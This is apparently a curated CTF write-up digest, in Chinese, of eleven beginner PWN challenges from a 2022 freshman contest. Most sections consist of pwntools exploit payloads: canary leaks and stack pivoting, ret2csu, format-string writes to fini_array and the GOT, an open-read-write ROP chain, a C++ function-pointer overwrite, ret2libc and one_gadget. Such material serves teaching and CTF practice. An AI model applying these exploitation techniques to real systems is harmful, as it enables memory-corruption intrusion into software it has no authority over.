---
title: 从新生赛入门PWN
contest: 新生赛 PWN 入门
year: 2022
difficulty: medium
vuln_type: pwn_unknown
tags: [canary绕过, 栈迁移, ret2csu, ret2text, fmtstr, fini_array, yellowgot, treasure, ret2libc, one_gadget]
attack_chain:
  - 题 1 pivot: canary 0x28+7 字节截断 + start=0x4010d0 栈迁移
  - 二次输入 0x37 字节泄 libc_base=u64(r(6))-128-0x29d10
  - ret2libc: pop_rdi+binsh+ret+system
  - 题 2 ret2csu: pop_rdi=0x4012b3 + write(1, write_got, 8) 泄 libc + main 重入
  - 题 3 ret2text: 0x4011e5 0x108 溢出覆盖返回地址
  - 题 4 fmtstr_level2: fini_array=0x4031f0 改 start + %15$s 泄 puts + puts_got 改 system
  - 题 5 yellowgot: 任意地址读 puts_got + pop_rax 链 close+read+open+read+puts
  - pop_rdi=0x23b6a, pop_rsi=0x2601f, pop_rdx=0x142c92, pop_rax=0x36174
  - 改 __stack_chk_fail=puts plt + atoi=gets
  - 题 6 treasure C++ 虚函数: UndiscoveredTreasure.description + edit 越界写 RareTreasure.description=DESC_FUNC* 指向 backdoor 0x40257A
  - 题 7 ret2libc: pop_rdi+puts_got+puts_plt+main 泄 libc + 二次溢出 system
  - 题 8 fmtstr_level1.5: %9011c%8$n + p64(0x4040A0) 写 4 字节
  - 题 9 ez_backdoor: 0x108+0x4011D2 ret
  - 题 10 smash: 0x1f8+p64(0x404060) 覆盖 flag_addr
  - 题 11 Catcat: %35$p 泄 libc + edit 0x20 字节 + one_gadget 0x50a37
key_payload: '9 题 PWN 题库：canary+栈迁移+ret2csu+fmtstr+虚函数+one_gadget'
one_liner: bad_c0de 新生赛 11 题 PWN 入门：canary/ret2csu/fmtstr/C++虚函数/ret2libc/orw。
lesson: canary 截断 7 字节 + '\x10' 末尾恢复；ret2csu 用 0x4012aa 0x401290 中间跳板；fini_array 写 fini_array[0]=start 触发 backdoor；C++ 虚函数 vtable 改写 + edit 越界写 description = backdoor 地址。
quality: high
---

# 从新生赛入门PWN

## 概览
- **来源**: 看雪论坛 bad_c0de
- **类型**: 新生赛 PWN 入门 11 题合集
- **难度**: ⭐⭐⭐

## 11 题清单

### 1. pivot (canary + 栈迁移)
```python
s(b'a'*0x28+b'\x10')  # canary 截断
ru(b'\x10')
canary = u64(r(7).rjust(8, b'\x00'))
payload = b'a'*0x108 + p64(canary) + b'a'*8 + p64(start)
# 二次输入 0x37 字节泄 libc_base
libc_base = u64(r(6).ljust(8, b'\x00')) - 128 - 0x29d10
payload = b'a'*0x28 + p64(canary) + b'a'*8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
```

### 2. ret2csu
```python
pop_rdi = 0x4012b3
payload = b'a'*0x108 + p64(0x4012aa) + p64(0) + p64(1) + p64(1) + p64(write_got) + p64(0x8) + p64(write_got) + p64(0x401290) + b'a'*8 + p64(0)*6 + p64(main)
```

### 3. ret2text
```python
while 1:
    io = process('./ret2text')
    payload = b'a'*0x108 + b'\xe5\x11'  # 后门函数
    s(payload)
    try: shell()
    except: io.close()
```

### 4. fmtstr_level2
```python
fini_array = 0x4031f0
payload = b'%15$s\x10\x10\x10' + fmtstr_payload(7, {fini_array: start}, 9) + p64(elf.got['puts'])
# 改 fini_array[0] = start 触发 backdoor
```

### 5. yellowgot (pop_rax 全套)
```python
pop_rdi = 0x23b6a + libc_base
pop_rsi = 0x2601f + libc_base
pop_rdx = 0x142c92 + libc_base
pop_rax = 0x36174 + libc_base
# 改 __stack_chk_fail = puts_plt, atoi = gets
payload = b'a'*0x28 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(0x404160) + p64(pop_rdx) + p64(0x20) + p64(read)
# close(0) + open(0x404160, 0) + read(0, 0x404200, 0x20) + puts(0x404200)
```

### 6. treasure (C++ 虚函数表)
```c
class UndiscoveredTreasure : public treasure {
    char description[0x10];
};
class RareTreasure : public treasure {
    DESC_FUNC description;  // 函数指针
};
vector<Treasure*> Treasure;
```
- 找 rare treasure (5% 概率) 记录 idx
- edit treasure[idx] 把 UndiscoveredTreasure.description 写 backdoor 0x40257A
- 由于 vtable 同布局，show 时调用 description() = backdoor = system("/bin/sh")

### 7. ret2libc
```python
pop_rdi = 0x401273
payload = b'a'*0x108 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
```

### 8. fmtstr_level1.5
```python
payload = '%9011c%8$n' + 'a'*6 + p64(0x4040A0)  # 写 0x4040A0 = 9011
```

### 9. ez_backdoor
```python
payload = b'a'*0x108 + p64(0x4011D2)
```

### 10. smash
```python
payload = b'a'*0x1f8 + p64(0x404060)  # 覆盖 flag_addr
```

### 11. Catcat
```python
add('%35$p')  # 泄 libc
newname = b'\x00'*8 + p64(one_gadget)  # one_gadget = 0x50a37
```
